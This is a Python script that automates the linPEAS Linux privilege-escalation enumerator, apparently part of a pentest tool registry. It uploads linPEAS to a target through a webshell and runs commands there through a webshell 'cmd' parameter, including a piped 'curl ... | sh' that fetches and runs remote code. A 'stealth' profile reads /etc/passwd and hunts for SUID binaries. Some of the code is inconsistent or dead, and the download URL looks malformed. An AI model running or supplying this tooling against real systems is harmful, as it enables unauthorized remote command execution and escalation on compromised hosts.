#!/usr/bin/env python3
"""
LinPEAS - Linux Privilege Escalation
"""

import os
import re
import sys
import requests
import subprocess
import json
from typing import Dict, List, Optional

def _project_root() -> str:
    """Get project root path"""
    return os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

def _registry_file() -> str:
    env_path = os.getenv("TOOLS_REGISTRY_YAML", "").strip()
    if env_path:
        return env_path
    root = _project_root()
    for candidate in (
        os.path.join(root, "docker", "tools_registry.yaml"),
        os.path.join(root, "tools_registry.yaml"),
    ):
        if os.path.exists(candidate):
            return candidate
    return os.path.join(root, "docker", "tools_registry.yaml")

def _load_tool_info(tool_name: str) -> Dict:
    """Load tool information from registry"""
    try:
        with open(_registry_file(), "r", encoding="utf-8") as f:
            import yaml
            data = yaml.safe_load(f)
            return data.get("tools", {}).get(tool_name, {})
    except Exception as e:
        print(f"Error loading tool info: {e}")
        return {}

def _build_cmd(commands: List[str], params: Dict) -> List[str]:
    """Build command with parameters"""
    merged_options = {}
    if params.get("options"):
        merged_options.update(params["options"])
    
    # Case-insensitive parameter mapping
    option_mappings = {
        "lhost": "LHOST",
        "lport": "LPORT", 
        "payload": "PAYLOAD",
        "cmd": "CMD",
        "command": "COMMAND",
        "targeturi": "TARGETURI",
        "mode": "MODE",
        "profile": "PROFILE"
    }
    
    if merged_options:
        for key, value in merged_options.items():
            upper_key = key.upper()
            if upper_key in option_mappings.values():
                continue
            if key.lower() in option_mappings:
                upper_key = option_mappings[key.lower()]
            merged_options[upper_key] = value
    
    mode = merged_options.get("MODE", "execute")
    profile = merged_options.get("PROFILE", "full")
    target = params.get("target", "")
    
    # Build linpeas command
    if mode == "download":
        if target:
            cmd = [f"python3 {__file__} download --target {target}"]
        else:
            print("Error: --target is required for download mode")
            sys.exit(1)
    elif mode == "execute":
        if target:
            cmd = [f"python3 {__file__} execute --target {target} --profile {profile}"]
        else:
            cmd = [f"python3 {__file__} local --profile {profile}"]
    else:  # default to full mode
        if target:
            cmd = [f"python3 {__file__} execute --target {target} --profile {profile}"]
        else:
            cmd = [f"python3 {__file__} local --profile {profile}"]
    
    return cmd

def _download_linpeas():
    """Download latest linPEAS script"""
    try:
        response = requests.get("https://github.com/carlosmr/peass/raw/master/linPEAS/linpeas.sh", timeout=30)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except Exception:
        return None

def _parse_output(stdout: str, stderr: str) -> dict:
    """Parse linPEAS output"""
    results = []
    vulnerabilities = []
    findings = []
    
    # Parse linPEAS output
    if stdout:
        lines = stdout.strip().split('\n')
        current_section = None
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Section headers
            if re.match(r'^[=]{20,}$', line):
                current_section = "separator"
                continue
            
            # Privilege escalation findings
            if "Privilege escalation" in line or "PE:" in line or "Possible" in line:
                vulnerabilities.append({
                    "type": "privilege_escalation",
                    "line": line,
                    "finding": line
                })
                results.append({"finding": line, "category": "privilege_escalation"})
            
            # Interesting files
            elif re.match(r'^/.+:', line) and ("root" in line or "suid" in line.lower() or "guid" in line.lower()):
                findings.append({
                    "type": "file_permission",
                    "line": line,
                    "finding": line
                })
                results.append({"finding": line, "category": "file_permissions"})
            
            # Network services
            elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', line):
                findings.append({
                    "type": "network_service",
                    "line": line,
                    "finding": line
                })
                results.append({"finding": line, "category": "network"})
            
            # Interesting configuration files
            elif re.match(r'^/etc/.+', line) and ("conf" in line or "cfg" in line or "config" in line):
                findings.append({
                    "type": "config_file",
                    "line": line,
                    "finding": line
                })
                results.append({"finding": line, "category": "config"})
            
            # Add all important lines to results
            elif any(keyword in line.lower() for keyword in ["vulnerable", "exploitable", "root", "sudo", "suid", "password", "key"]):
                results.append({"line": line})
        
        # Group findings by category
        categorized = {}
        for result in results:
            category = result.get("category", "general")
            if category not in categorized:
                categorized[category] = []
            categorized[category].append(result)
        
        if categorized:
            parsed_output = {"findings": categorized}
        else:
            parsed_output = {"raw_output": stdout[:2000]}
    
    return {"results": results} if results else {"raw_output": (stdout + stderr)[:2000]}

def main():
    """Main execution function"""
    try:
        import yaml
    except ImportError:
        print("Error: PyYAML is required for YAML parsing")
        sys.exit(1)
    
    if len(sys.argv) < 2:
        print("Usage: python3 execute.py <command> [options]")
        print("Commands:")
        print("  download --target <url>")
        print("  execute --target <url> --profile <quick|stealth|full>")
        print("  local --profile <quick|stealth|full>")
        sys.exit(1)
    
    command = sys.argv[1]
    
    if command == "download":
        if len(sys.argv) < 3:
            print("Error: download requires --target")
            sys.exit(1)
        
        target = None
        for i, arg in enumerate(sys.argv[2:], 2):
            if arg == "--target" and i + 1 < len(sys.argv):
                target = sys.argv[i + 1]
        
        if not target:
            print("Error: --target is required")
            sys.exit(1)
        
        print("Downloading linPEAS script...")
        linpeas_content = _download_linpeas()
        
        if linpeas_content:
            # Upload via webshell
            try:
                response = requests.post(target, data={"linpeas": linpeas_content}, timeout=60)
                if response.status_code == 200:
                    print("linPEAS script uploaded successfully")
                else:
                    print(f"Upload failed: {response.status_code}")
                    sys.exit(1)
            except Exception as e:
                print(f"Error uploading linPEAS: {e}")
                sys.exit(1)
        else:
            print("Error downloading linPEAS script")
            sys.exit(1)
    
    elif command == "execute":
        if len(sys.argv) < 3:
            print("Error: execute requires --target")
            sys.exit(1)
        
        target = None
        profile = "full"
        
        for i, arg in enumerate(sys.argv[2:], 2):
            if arg == "--target" and i + 1 < len(sys.argv):
                target = sys.argv[i + 1]
            elif arg == "--profile" and i + 1 < len(sys.argv):
                profile = sys.argv[i + 1]
        
        if not target:
            print("Error: --target is required")
            sys.exit(1)
        
        # Build linPEAS command
        if profile == "quick":
            linpeas_cmd = "whoami && uname -a && id && sudo -l"
        elif profile == "stealth":
            linpeas_cmd = "whoami && id && cat /etc/passwd && find / -type f -perm -4000 2>/dev/null | head -10"
        else:  # full
            linpeas_cmd = "curl https://github.com/carlosmr/peass/raw/master/linPEAS/linpeas.sh | sh"
        
        # Execute via webshell
        try:
            response = requests.get(f"{target}?cmd={requests.utils.quote(linpeas_cmd)}", timeout=300)
            
            if response.status_code == 200:
                # Try to extract linPEAS output from response
                patterns = [
                    r'<pre>(.*?)</pre>',
                    r'<textarea>(.*?)</textarea>',
                    r'Output:\s*(.*)',
                    r'Result:\s*(.*)'
                ]
                
                output = ""
                for pattern in patterns:
                    match = re.search(pattern, response.text, re.DOTALL | re.IGNORECASE)
                    if match:
                        output = match.group(1).strip()
                        break
                
                if not output:
                    output = response.text
                
                parsed_output = _parse_output(output, "")
                print(json.dumps(parsed_output, indent=2))
            else:
                print(f"Execution failed: {response.status_code} - {response.text}")
                sys.exit(1)
                
        except Exception as e:
            print(f"Error executing linPEAS: {e}")
            sys.exit(1)
    
    elif command == "local":
        if len(sys.argv) < 2:
            print("Error: local command requires profile")
            sys.exit(1)
        
        profile = "full"
        
        for i, arg in enumerate(sys.argv[1:], 1):
            if arg == "--profile" and i + 1 < len(sys.argv):
                profile = sys.argv[i + 1]
        
        # Download linPEAS
        print("Downloading linPEAS script...")
        linpeas_content = _download_linpeas()
        
        if not linpeas_content:
            print("Error downloading linPEAS script")
            sys.exit(1)
        
        # Write to temporary file
        temp_file = "/tmp/linpeas.sh"
        try:
            with open(temp_file, "w") as f:
                f.write(linpeas_content)
            
            os.chmod(temp_file, 0o755)
            
            # Execute based on profile
            if profile == "quick":
                cmd = ["sh", "-c", "whoami && uname -a && id && sudo -l"]
            elif profile == "stealth":
                cmd = ["sh", "-c", "whoami && id && cat /etc/passwd && find / -type f -perm -4000 2>/dev/null | head -10"]
            else:  # full
                cmd = ["sh", temp_file]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                parsed_output = _parse_output(result.stdout, result.stderr)
                print(json.dumps(parsed_output, indent=2))
            else:
                print(f"Command failed with return code {result.returncode}")
                if result.stderr:
                    print(f"Error: {result.stderr}")
                sys.exit(1)
                
        except Exception as e:
            print(f"Error executing linPEAS: {e}")
            sys.exit(1)
        
        finally:
            # Clean up
            if os.path.exists(temp_file):
                os.remove(temp_file)
    
    else:
        print(f"Unknown command: {command}")
        sys.exit(1)

if __name__ == "__main__":
    main()
